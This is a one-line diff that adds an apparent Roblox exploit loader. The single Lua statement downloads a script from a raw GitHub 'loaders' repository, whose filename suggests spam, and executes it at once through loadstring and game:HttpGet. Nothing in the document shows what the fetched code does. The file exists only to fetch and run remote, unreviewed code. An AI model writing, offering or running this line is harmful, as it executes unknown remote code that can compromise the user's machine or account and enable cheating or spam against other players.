@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/upd-8-cvr-retro-spam5-zlly862mh07f2g.lua"))()
